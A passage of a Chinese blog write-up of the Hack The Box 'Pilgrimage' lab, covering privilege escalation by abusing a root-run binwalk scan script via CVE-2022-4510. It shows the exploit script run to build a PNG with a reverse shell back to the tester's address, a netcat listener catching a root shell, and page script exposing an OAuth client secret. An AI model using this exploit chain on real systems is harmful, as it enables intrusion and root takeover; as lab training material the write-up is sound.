+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>查看可写文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~/.local/share/nano$ find / -<span class="hljs-built_in">type</span> d -writable 2&gt;/dev/null<br>/proc/2716/task/2716/fd<br>/proc/2716/fd<br>/proc/2716/map_files<br>/run/user/1000<br>/run/user/1000/gnupg<br>/run/user/1000/systemd<br>/run/user/1000/systemd/units<br>/run/user/1000/systemd/inaccessible<br>/run/lock<br>/var/www/pilgrimage.htb/shrunk<br>/var/www/pilgrimage.htb/tmp<br>/var/lib/php/sessions<br>/var/tmp<br>/home/emily<br>/home/emily/.local<br>/home/emily/.local/share<br>/home/emily/.local/share/nano<br>/home/emily/.config<br>/home/emily/.config/binwalk<br>/home/emily/.config/binwalk/plugins<br>/home/emily/.config/binwalk/modules<br>/home/emily/.config/binwalk/config<br>/home/emily/.config/binwalk/magic<br>/dev/mqueue<br>/dev/shm<br>/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service<br>/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice<br>/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope<br>/tmp<br>/tmp/.ICE-unix<br>/tmp/.X11-unix<br>/tmp/.font-unix<br>/tmp/.Test-unix<br>/tmp/.XIM-unix<br></code></pre></td></tr></table></figure>
+
+<p>查看.config 文件，没有收获。看一看进程信息，发现有个 sh 脚本在跑，而且是 root 用户属主</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~$ ps aux<br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root         746  0.0  0.0   6816  2352 ?        S    15:50   0:00 /bin/bash /usr/sbin/malwarescan.sh<br>emily@pilgrimage:~$ <span class="hljs-built_in">ls</span> -liah /usr/sbin/malwarescan.sh<br>31049 -rwxr--r-- 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh<br>emily@pilgrimage:~$ <span class="hljs-built_in">cat</span> /usr/sbin/malwarescan.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>blacklist=(<span class="hljs-string">&quot;Executable script&quot;</span> <span class="hljs-string">&quot;Microsoft executable&quot;</span>)<br><br>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> FILE; <span class="hljs-keyword">do</span><br>        filename=<span class="hljs-string">&quot;/var/www/pilgrimage.htb/shrunk/<span class="hljs-subst">$(/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#x27;s/^.*CREATE //p&#x27;)</span>&quot;</span><br>        binout=<span class="hljs-string">&quot;<span class="hljs-subst">$(/usr/local/bin/binwalk -e <span class="hljs-string">&quot;<span class="hljs-variable">$filename</span>&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">for</span> banned <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;blacklist[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>                <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$binout</span>&quot;</span> == *<span class="hljs-string">&quot;<span class="hljs-variable">$banned</span>&quot;</span>* ]]; <span class="hljs-keyword">then</span><br>                        /usr/bin/rm <span class="hljs-string">&quot;<span class="hljs-variable">$filename</span>&quot;</span><br>                        <span class="hljs-built_in">break</span><br>                <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>用 chatgpt 解释一下这个文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建一个名为 blacklist 的数组，包含两个字符串元素</span><br>blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 inotifywait 监听 /var/www/pilgrimage.htb/shrunk/ 目录内的新文件，并使用 <span class="hljs-keyword">while</span> 循环逐行读取文件</span><br>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">		# </span><span class="language-bash">构建完整的文件路径，从 FILE 变量中提取最后一行，并去除开头的 <span class="hljs-string">&quot;CREATE &quot;</span> 字符串，拼接成文件路径</span><br>        filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#x27;s/^.*CREATE //p&#x27;)&quot;<br>        <br>        # 使用 binwalk 工具对指定的文件进行解析，将输出保存到 binout 变量<br>        binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot;<br>        <br>        # 遍历 blacklist 数组中的元素<br>        for banned in &quot;$&#123;blacklist[@]&#125;&quot;; do<br>        <br>		        # 如果 binout 变量的内容包含 blacklist 数组中的元素<br>                if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then<br>                <br>		                # 使用 rm 命令删除对应的文件 break<br>                        /usr/bin/rm &quot;$filename&quot;<br>                        break<br>                fi<br>        done<br>done<br></code></pre></td></tr></table></figure>
+
+<h3 id="binwalk-命令执行漏洞-root-脚本调用"><a href="#binwalk-命令执行漏洞-root-脚本调用" class="headerlink" title="binwalk 命令执行漏洞+root 脚本调用"></a>binwalk 命令执行漏洞+root 脚本调用</h3><p>既然使用了 binwalk 来对文件进行操作了，那就看一看 binwalk 是否存在漏洞，进而实现 root 执行的 sh 脚本调用 binwalk 反弹 shell 或提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Pilgrimage]<br>└─$ searchsploit binwalk<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                                                                                                                                        |  Path<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Binwalk v2.3.2 - Remote Command Execution (RCE)                                                                                                                                                       | python/remote/51249.py<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br><br></code></pre></td></tr></table></figure>
+
+<p>有个代码执行的漏洞，看一看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;binwalk_exploit.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br>    f.write(header_pfs)<br>    f.write(content)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You can now rename and share binwalk_exploit and start your local netcat listener.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>脚本的最后似乎是将反弹 shell 写入了 png 文件里，这正好符合我们的需求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:/tmp$ python3 51249.py vjp.png 10.10.14.145 443<br><br><span class="hljs-comment">################################################</span><br>------------------CVE-2022-4510----------------<br><span class="hljs-comment">################################################</span><br>--------Binwalk Remote Command Execution--------<br>------Binwalk 2.1.2b through 2.3.2 included-----<br>------------------------------------------------<br><span class="hljs-comment">################################################</span><br>----------Exploit by: Etienne Lacoche-----------<br>---------Contact Twitter: @electr0sm0g----------<br>------------------Discovered by:----------------<br>---------Q. Kaiser, ONEKEY Research Lab---------<br>---------Exploit tested on debian 11------------<br><span class="hljs-comment">################################################</span><br><br><br>You can now rename and share binwalk_exploit and start your <span class="hljs-built_in">local</span> netcat listener.<br><br>emily@pilgrimage:/tmp$ <span class="hljs-built_in">ls</span><br>51249.py  binwalk_exploit.png  systemd-private-e23853b016894d04af52d9c886a7a73b-systemd-logind.service-NPxI5h  systemd-private-e23853b016894d04af52d9c886a7a73b-systemd-timesyncd.service-2Jbd5e  vjp.png  vmware-root_609-3988556153<br></code></pre></td></tr></table></figure>
+
+<p>文件夹下多了一个 binwalk_exploit.png，本机提前开启监听，将其复制到脚本持续扫描的目录中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:/tmp$ <span class="hljs-built_in">cp</span> binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/<br></code></pre></td></tr></table></figure>
+
+<p>反弹 shell 成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[/usr/share/wordlists]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.219] 49676<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br>quarantine<br>reset.sh<br>root.txt<br><span class="hljs-built_in">cat</span> root.txt<br><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">uname</span> -a<br>Linux pilgrimage 5.10.0-23-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:e8:f2 brd ff:ff:ff:ff:ff:ff<br>    altname enp3s0<br>    altname ens160<br>    inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><p>这台靶机攻击路径给的很好，并没有直接简单粗暴地使用漏洞脚本去 getshell，而是把场景藏在了 <code>.git</code> 泄露中，并且把 Web 提供服务的程序放入了其中，从程序判断出任意文件读取，再加上通过泄露的 <code>login.php</code> 文件中提到了连接的数据库文件，自然而然地梳理出读取数据库文件的思路，提权的场景也做得比较用心，把提权思路藏在了正在运行的进程中。总得来说，是一台很锻炼渗透思路和搜索排查能力的靶机，很值得打一打。</p>
+<h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p>HTB 靶机更新频繁，可以从中学习到许多新的知识，过去打完靶机关于总结复盘和知识补充可能草草了之，对靶机并没有吃透，所以新增加了总结复盘和知识补充这两个部分，希望自己可以学得更加深入。</p>
+<h3 id="git-泄露-1"><a href="#git-泄露-1" class="headerlink" title=".git 泄露"></a>.git 泄露</h3><p>.git 泄露有两种情景，一种是启用了目录索引，另一种是禁止了目录索引。对于这两种情况，也需要使用不同的工具进行操作</p>
+<p>工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker">WangYihang&#x2F;GitHacker：🕷️一个“.git”文件夹利用工具，能够恢复整个Git存储库，包括存储，公共分支，公共标签。 (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">lijiejie&#x2F;GitHack: A <code>.git</code> folder disclosure exploit (github.com)</a> </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/internetwache/GitTools">internetwache&#x2F;GitTools: A repository with 3 tools for pwn’ing websites with .git repositories available (github.com)</a></p>
+<p>从结果上看，GitHacker 能够获得更加完善的信息，但感觉动静应该也不小，按需取用吧</p>
+<p>将 git 文件夹下载下来后，我们需要可用切换到其目录下，尝试使用以下命令来获取信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看日志</span><br>git <span class="hljs-built_in">log</span><br><br><span class="hljs-comment"># 查看提交的区别</span><br>git diff + CommitId<br><br><span class="hljs-comment"># 查看最近的更改</span><br>git status<br><br><span class="hljs-comment"># 恢复上次提交的历史状态</span><br>git checkout -- . or git restore .<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pilgrimage 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/e8652c909b79.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/4537b1f7b404.html" title="DC-2 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC-2 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/ce627963c73e.html" title="LazySysAdmin_1 靶机">
+                        <span class="hidden-mobile">LazySysAdmin_1 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '49534e0cf299482053fa4e4d2f277071'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
